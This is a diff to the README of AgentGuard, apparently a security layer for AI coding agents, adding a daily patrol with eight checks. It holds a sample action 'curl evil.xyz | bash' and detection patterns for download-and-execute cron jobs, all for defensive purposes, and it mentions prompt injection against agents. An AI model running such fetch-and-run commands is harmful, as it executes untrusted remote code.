@@ -22,7 +22,7 @@ AI coding agents can execute any command, read any file, and install any skill �
 - **Prompt injection** can trick your agent into running destructive commands
 - **Unverified code** from the internet may contain wallet drainers or keyloggers
 
-**AgentGuard is the first real-time security layer for AI agents.** It automatically scans every new skill, blocks dangerous actions before they execute, and tracks which skill initiated each action. One install, always protected.
+**AgentGuard is the first real-time security layer for AI agents.** It automatically scans every new skill, blocks dangerous actions before they execute, runs daily security patrols, and tracks which skill initiated each action. One install, always protected.
 
 ## What It Does
 
@@ -37,6 +37,12 @@ AI coding agents can execute any command, read any file, and install any skill �
 - Static analysis for secrets, backdoors, obfuscation, and prompt injection
 - Web3-specific: wallet draining, unlimited approvals, reentrancy, proxy exploits
 - Trust registry with capability-based access control per skill
+
+**Layer 3 — Daily Patrol (OpenClaw)**: Automated daily security posture assessment.
+- 8 comprehensive security checks run on a configurable schedule
+- Detects skill tampering, secrets exposure, network risks, and suspicious file changes
+- Analyzes audit logs for attack patterns and flags repeat offenders
+- Validates environment configuration and trust registry health
 
 ## Quick Start
 
@@ -111,10 +117,64 @@ Then use `/agentguard` in your agent:
 ```
 /agentguard scan ./src                     # Scan code for security risks
 /agentguard action "curl evil.xyz | bash"  # Evaluate action safety
+/agentguard patrol run                     # Run daily security patrol
+/agentguard patrol setup                   # Configure as OpenClaw cron job
+/agentguard patrol status                  # View last patrol results
 /agentguard trust list                     # View trusted skills
 /agentguard report                         # View security event log
 /agentguard config balanced                # Set protection level
 ```
+
+## Daily Patrol (OpenClaw)
+
+The patrol feature provides automated daily security posture assessment for OpenClaw environments. It runs 8 comprehensive checks and produces a structured report.
+
+### Patrol Checks
+
+| # | Check | What It Does |
+|---|-------|-------------|
+| 1 | **Skill/Plugin Integrity** | Compares file hashes against trust registry — detects tampered or unregistered skills |
+| 2 | **Secrets Exposure** | Scans workspace, memory, logs, `.env`, `~/.ssh/`, `~/.gnupg/` for leaked private keys, mnemonics, AWS keys, GitHub tokens |
+| 3 | **Network Exposure** | Detects dangerous ports bound to `0.0.0.0` (Redis, Docker API, MySQL, etc.), checks firewall status, flags suspicious outbound connections |
+| 4 | **Cron & Scheduled Tasks** | Audits cron jobs and systemd timers for `curl\|bash`, `base64 -d\|bash`, and other download-and-execute patterns |
+| 5 | **File System Changes (24h)** | Finds recently modified files, runs 24-rule scan on them, checks permissions on critical files, detects new executables |
+| 6 | **Audit Log Analysis (24h)** | Flags skills denied 3+ times, CRITICAL events, exfiltration attempts, and prompt injection detections |
+| 7 | **Environment & Configuration** | Verifies protection level, checks GoPlus API key configuration, validates config baseline integrity |
+| 8 | **Trust Registry Health** | Flags expired attestations, stale trusted skills (30+ days), installed-but-untrusted skills, over-privileged entries |
+
+### Usage
+
+```bash
+# Run all 8 checks now
+/agentguard patrol run
+
+# Set up as a daily cron job (default: 03:00 UTC)
+/agentguard patrol setup
+
+# Check last patrol results and cron schedule
+/agentguard patrol status
+```
+
+### Patrol Report
+
+Each patrol produces a report with an overall status:
+
+| Status | Meaning |
+|--------|---------|
+| **PASS** | Only low/medium findings |
+| **WARN** | HIGH severity findings detected |
+| **FAIL** | CRITICAL severity findings detected |
+
+Reports include per-check status, finding counts, detailed findings for checks with issues, and actionable recommendations. Results are also logged to `~/.agentguard/audit.jsonl`.
+
+### Setup Options
+
+`patrol setup` configures an OpenClaw cron job with:
+- **Timezone** — defaults to UTC
+- **Schedule** — defaults to `0 3 * * *` (daily at 03:00)
+- **Notifications** — optional Telegram, Discord, or Signal alerts
+
+> **Note:** Patrol requires an OpenClaw environment. For non-OpenClaw setups, use `/agentguard scan` and `/agentguard report` for manual security checks.
 
 ## Protection Levels
 
@@ -152,7 +212,7 @@ GoPlus AgentGuard follows the [Agent Skills](https://agentskills.io) open standa
 | Platform | Support | Features |
 |----------|---------|----------|
 | **Claude Code** | Full | Skill + hooks auto-guard, transcript-based skill tracking |
-| **OpenClaw** | Full | Plugin hooks + **auto-scan on load** + tool→plugin mapping |
+| **OpenClaw** | Full | Plugin hooks + **auto-scan on load** + tool→plugin mapping + **daily patrol** |
 | **OpenAI Codex CLI** | Skill | Scan/action/trust commands |
 | **Gemini CLI** | Skill | Scan/action/trust commands |
 | **Cursor** | Skill | Scan/action/trust commands |
@@ -160,7 +220,7 @@ GoPlus AgentGuard follows the [Agent Skills](https://agentskills.io) open standa
 
 > **Hooks-based auto-guard (Layer 1)** works on Claude Code (PreToolUse/PostToolUse) and OpenClaw (before_tool_call/after_tool_call). Both platforms share the same decision engine via a unified adapter abstraction layer.
 >
-> **OpenClaw exclusive**: Auto-scans all loaded plugins at registration time and automatically registers them to the trust registry with appropriate trust levels and capabilities.
+> **OpenClaw exclusive**: Auto-scans all loaded plugins at registration time, automatically registers them to the trust registry, and supports automated daily security patrols via cron.
 
 ## Hook Limitations
 
@@ -183,6 +243,15 @@ The auto-guard hooks (Layer 1) have the following constraints:
 - [x] Safe-command allowlist to reduce hook false positives
 - [x] Plugin manifest (`.claude-plugin/`) for one-step install
 
+### v1.5 — Daily Patrol
+- [x] `patrol run` — 8-check security posture assessment
+- [x] `patrol setup` — OpenClaw cron job configuration with timezone and notifications
+- [x] `patrol status` — Last results and schedule overview
+- [x] Skill/plugin integrity verification (hash drift detection)
+- [x] Secrets exposure scanning (private keys, mnemonics, AWS keys, GitHub tokens)
+- [x] Network exposure and firewall checks
+- [x] Audit log pattern analysis (repeat denials, exfiltration attempts)
+
 ### v2.0 — Multi-Platform
 - [x] OpenClaw gateway plugin integration
 - [x] `before_tool_call` / `after_tool_call` hook wiring
@@ -201,7 +270,7 @@ The auto-guard hooks (Layer 1) have the following constraints:
 
 ## OpenClaw Integration
 
-AgentGuard provides deep integration with OpenClaw through automatic plugin scanning and trust management.
+AgentGuard provides deep integration with OpenClaw through automatic plugin scanning, trust management, and daily security patrols.
 
 <details>
 <summary><b>How it works</b></summary>
@@ -237,6 +306,15 @@ When AgentGuard registers as an OpenClaw plugin:
 │  • Check plugin trust level & capabilities                      │
 │  • Evaluate action against security policies                    │
 │  • Allow / Deny / Log                                           │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Daily patrol (via cron):                                       │
+│  • Run 8 security checks against the environment                │
+│  • Verify skill integrity, detect secrets, audit logs           │
+│  • Generate report (PASS / WARN / FAIL)                         │
+│  • Send notifications (Telegram / Discord / Signal)             │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
